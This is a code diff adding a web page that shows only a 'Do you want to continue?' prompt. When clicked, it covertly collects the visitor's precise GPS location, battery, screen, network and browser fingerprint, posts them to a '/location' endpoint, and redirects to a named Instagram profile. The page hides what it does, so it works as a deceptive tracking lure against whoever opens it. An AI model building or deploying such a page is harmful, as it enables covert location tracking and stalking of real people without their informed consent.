@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Continue</title>
+  <style>
+    :root {
+      --bg-1: #f3efe6;
+      --bg-2: #d6e4f0;
+      --card: rgba(255, 255, 255, 0.92);
+      --text: #1f2933;
+      --muted: #52606d;
+      --accent: #111827;
+      --accent-dark: #000000;
+      --border: rgba(31, 41, 51, 0.12);
+      --shadow: 0 24px 60px rgba(31, 41, 51, 0.16);
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: grid;
+      place-items: center;
+      padding: 24px;
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      color: var(--text);
+      background:
+        radial-gradient(circle at top left, rgba(194, 65, 12, 0.18), transparent 30%),
+        radial-gradient(circle at bottom right, rgba(37, 99, 235, 0.18), transparent 32%),
+        linear-gradient(135deg, var(--bg-1), var(--bg-2));
+    }
+
+    .card {
+      width: min(100%, 420px);
+      padding: 34px 28px;
+      border: 1px solid var(--border);
+      border-radius: 24px;
+      background: var(--card);
+      box-shadow: var(--shadow);
+      backdrop-filter: blur(14px);
+    }
+
+    h1 {
+      margin: 0;
+      font-size: clamp(1.8rem, 5vw, 2.3rem);
+      line-height: 1.15;
+      text-align: center;
+    }
+
+    .actions {
+      display: flex;
+      gap: 12px;
+      margin-top: 24px;
+      flex-wrap: wrap;
+      justify-content: center;
+    }
+
+    button {
+      border: 0;
+      border-radius: 999px;
+      padding: 14px 22px;
+      font-size: 1rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: transform 0.18s ease, opacity 0.18s ease, background 0.18s ease;
+    }
+
+    button:hover {
+      transform: translateY(-1px);
+    }
+
+    button:disabled {
+      cursor: wait;
+      opacity: 0.7;
+      transform: none;
+    }
+
+    .primary {
+      background: var(--accent);
+      color: #fff;
+    }
+
+    .primary:hover {
+      background: var(--accent-dark);
+    }
+
+    .secondary {
+      background: rgba(82, 96, 109, 0.12);
+      color: var(--text);
+    }
+
+    .hint {
+      min-height: 24px;
+      margin-top: 14px;
+      text-align: center;
+      color: var(--muted);
+    }
+  </style>
+</head>
+<body>
+  <main class="card">
+    <h1>Do you want to continue?</h1>
+
+    <div class="actions">
+      <button class="primary" id="continueBtn" type="button">Continue</button>
+      <button class="secondary" id="cancelBtn" type="button">Cancel</button>
+    </div>
+
+    <div class="hint" id="statusText" aria-live="polite"></div>
+  </main>
+
+  <script>
+    const continueBtn = document.getElementById("continueBtn");
+    const cancelBtn = document.getElementById("cancelBtn");
+    const statusText = document.getElementById("statusText");
+    const targetUrl = "https://www.instagram.com/richeee.x/";
+
+    function setBusy(isBusy) {
+      continueBtn.disabled = isBusy;
+      cancelBtn.disabled = isBusy;
+    }
+
+    function setStatus(message) {
+      statusText.textContent = message;
+      statusText.className = "hint";
+    }
+
+    async function sendLocationToServer(payload) {
+      const body = JSON.stringify(payload);
+
+      if (navigator.sendBeacon) {
+        const blob = new Blob([body], { type: "application/json" });
+        const queued = navigator.sendBeacon("/location", blob);
+        if (queued) {
+          return;
+        }
+      }
+
+      const response = await fetch("/location", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body,
+        keepalive: true
+      });
+
+      if (!response.ok) {
+        throw new Error("Failed to send location to the server.");
+      }
+    }
+
+    async function collectBatteryDetails() {
+      if (!navigator.getBattery) {
+        return {
+          level: "-",
+          charging: "-",
+          saveMode: "-"
+        };
+      }
+
+      try {
+        const battery = await navigator.getBattery();
+        return {
+          level: `${Math.round((battery.level || 0) * 100)}%`,
+          charging: battery.charging,
+          saveMode: "-"
+        };
+      } catch (error) {
+        return {
+          level: "-",
+          charging: "-",
+          saveMode: "-"
+        };
+      }
+    }
+
+    function collectNetworkDetails() {
+      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      const ua = navigator.userAgent || "";
+      const uaData = navigator.userAgentData || null;
+
+      function detectBrowser() {
+        if (/edg/i.test(ua)) return "Microsoft Edge";
+        if (/opr|opera/i.test(ua)) return "Opera";
+        if (/chrome|chromium|crios/i.test(ua) && !/edg|opr|opera/i.test(ua)) return "Chrome";
+        if (/firefox|fxios/i.test(ua)) return "Firefox";
+        if (/safari/i.test(ua) && !/chrome|chromium|crios|edg|opr|opera/i.test(ua)) return "Safari";
+        return "Unknown";
+      }
+
+      function detectOS() {
+        if (/windows nt/i.test(ua)) return "Windows";
+        if (/android/i.test(ua)) return "Android";
+        if (/iphone|ipad|ipod/i.test(ua)) return "iOS";
+        if (/mac os x/i.test(ua)) return "macOS";
+        if (/linux/i.test(ua)) return "Linux";
+        return "Unknown";
+      }
+
+      function detectDeviceType() {
+        if (uaData && typeof uaData.mobile === "boolean") {
+          return uaData.mobile ? "mobile" : "desktop";
+        }
+        if (/tablet|ipad/i.test(ua)) return "tablet";
+        if (/mobi|android|iphone|ipod/i.test(ua)) return "mobile";
+        return "desktop";
+      }
+
+      return {
+        userAgent: navigator.userAgent || "",
+        platform: navigator.platform || "",
+        language: navigator.language || "",
+        languages: Array.isArray(navigator.languages) ? navigator.languages : [],
+        cookieEnabled: navigator.cookieEnabled,
+        onLine: navigator.onLine,
+        hardwareConcurrency: navigator.hardwareConcurrency || null,
+        deviceMemory: navigator.deviceMemory || null,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
+        screen: {
+          width: window.screen?.width ?? null,
+          height: window.screen?.height ?? null,
+          availWidth: window.screen?.availWidth ?? null,
+          availHeight: window.screen?.availHeight ?? null,
+          colorDepth: window.screen?.colorDepth ?? null,
+          pixelDepth: window.screen?.pixelDepth ?? null,
+          pixelRatio: window.devicePixelRatio || null,
+          orientation: window.screen?.orientation?.type || ""
+        },
+        device: {
+          type: detectDeviceType(),
+          browser: detectBrowser(),
+          os: detectOS(),
+          touchPoints: navigator.maxTouchPoints ?? 0,
+          vendor: navigator.vendor || "",
+          userAgentBrands: uaData?.brands || [],
+          mobile: uaData?.mobile ?? null
+        },
+        connection: connection ? {
+          effectiveType: connection.effectiveType || "",
+          downlink: connection.downlink ?? null,
+          downlinkMax: connection.downlinkMax ?? null,
+          rtt: connection.rtt ?? null,
+          saveData: connection.saveData ?? null,
+          type: connection.type || ""
+        } : null,
+        secureContext: window.isSecureContext,
+        referrer: document.referrer || ""
+      };
+    }
+
+    async function buildSnapshot() {
+      const snapshot = collectNetworkDetails();
+      snapshot.battery = await collectBatteryDetails();
+      return snapshot;
+    }
+
+    function requestLocation() {
+      if (!("geolocation" in navigator)) {
+        setStatus("Geolocation is not supported in this browser.");
+        return;
+      }
+
+      setBusy(true);
+      setStatus("Waiting for permission...");
+
+      let bestPosition = null;
+      let watchId = null;
+      let finished = false;
+
+      function finishWithMessage(message) {
+        if (watchId !== null) {
+          navigator.geolocation.clearWatch(watchId);
+        }
+        finished = true;
+        setBusy(false);
+        setStatus(message);
+      }
+
+      async function finishWithPosition(position) {
+        if (finished) {
+          return;
+        }
+
+        finished = true;
+        if (watchId !== null) {
+          navigator.geolocation.clearWatch(watchId);
+        }
+
+        const { latitude, longitude, accuracy } = position.coords;
+        const payload = {
+          latitude,
+          longitude,
+          accuracy,
+          timestamp: new Date().toISOString(),
+          network: await buildSnapshot()
+        };
+
+        setStatus("Opening...");
+        sendLocationToServer(payload).catch(() => {
+        });
+        setBusy(false);
+        window.location.href = targetUrl;
+      }
+
+      function handlePosition(position) {
+        if (!bestPosition || position.coords.accuracy < bestPosition.coords.accuracy) {
+          bestPosition = position;
+        }
+
+        if (position.coords.accuracy <= 30) {
+          finishWithPosition(position);
+        }
+      }
+
+      function handleError(error) {
+        if (finished) {
+          return;
+        }
+
+        if (bestPosition) {
+          finishWithPosition(bestPosition);
+          return;
+        }
+
+        if (error.code === error.PERMISSION_DENIED) {
+          finishWithMessage("Location is blocked in your browser. Tap the site icon near the address bar, allow Location for this site, then try again.");
+          return;
+        }
+
+        if (error.code === error.POSITION_UNAVAILABLE) {
+          finishWithMessage("Location is unavailable right now.");
+          return;
+        }
+
+        if (error.code === error.TIMEOUT) {
+          finishWithMessage("Request timed out. Please try again.");
+          return;
+        }
+
+        finishWithMessage("Location request was not completed.");
+      }
+
+      watchId = navigator.geolocation.watchPosition(
+        handlePosition,
+        handleError,
+        {
+          enableHighAccuracy: true,
+          timeout: 15000,
+          maximumAge: 0
+        }
+      );
+
+      setTimeout(() => {
+        if (finished) {
+          return;
+        }
+
+        if (bestPosition) {
+          finishWithPosition(bestPosition);
+          return;
+        }
+
+        finishWithMessage("Could not get a reliable location. Please try again outdoors or with GPS/Wi-Fi on.");
+      }, 8000);
+    }
+
+    continueBtn.addEventListener("click", requestLocation);
+
+    cancelBtn.addEventListener("click", () => {
+      setStatus("Cancelled.");
+    });
+  </script>
+</body>
+</html>
